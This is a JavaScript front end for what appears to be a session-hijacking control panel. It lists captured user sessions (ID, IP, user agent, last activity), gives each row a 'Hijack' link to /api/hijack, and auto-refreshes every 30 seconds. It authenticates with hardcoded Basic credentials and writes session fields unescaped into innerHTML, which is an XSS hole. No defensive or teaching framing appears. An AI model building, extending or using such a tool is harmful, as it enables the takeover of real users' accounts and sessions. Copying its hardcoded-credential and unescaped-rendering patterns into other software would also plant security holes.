document.addEventListener('DOMContentLoaded', () => {
    const refreshBtn = document.getElementById('refresh');
    const searchInput = document.getElementById('search');
    
    refreshBtn.addEventListener('click', loadSessions);
    searchInput.addEventListener('input', filterSessions);
    
    loadSessions();
    
    // Auto-refresh every 30 seconds
    setInterval(loadSessions, 30000);
});

async function loadSessions() {
    try {
        const response = await fetch('/api/sessions', {
            headers: {
                'Authorization': 'Basic ' + btoa('admin:securepw')
            }
        });
        
        if (!response.ok) throw new Error('Failed to load sessions');
        
        const sessions = await response.json();
        renderSessions(sessions);
    } catch (error) {
        console.error('Error:', error);
        document.getElementById('sessions').innerHTML = 
            '<div class="error">Error loading sessions. Please try again.</div>';
    }
}

function renderSessions(sessions) {
    let html = `
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>IP</th>
                <th>User Agent</th>
                <th>Last Active</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>`;
    
    for (const id in sessions) {
        const s = sessions[id];
        html += `
        <tr>
            <td>${s.id}</td>
            <td>${s.ip}</td>
            <td>${s.user_agent}</td>
            <td>${new Date(s.last_active).toLocaleString()}</td>
            <td><a href="/api/hijack?id=${s.id}" class="hijack-btn">Hijack</a></td>
        </tr>`;
    }
    
    html += `</tbody></table>`;
    document.getElementById('sessions').innerHTML = html;
}

function filterSessions() {
    const searchTerm = this.value.toLowerCase();
    document.querySelectorAll('#sessions tbody tr').forEach(row => {
        const text = row.textContent.toLowerCase();
        row.style.display = text.includes(searchTerm) ? '' : 'none';
    });
}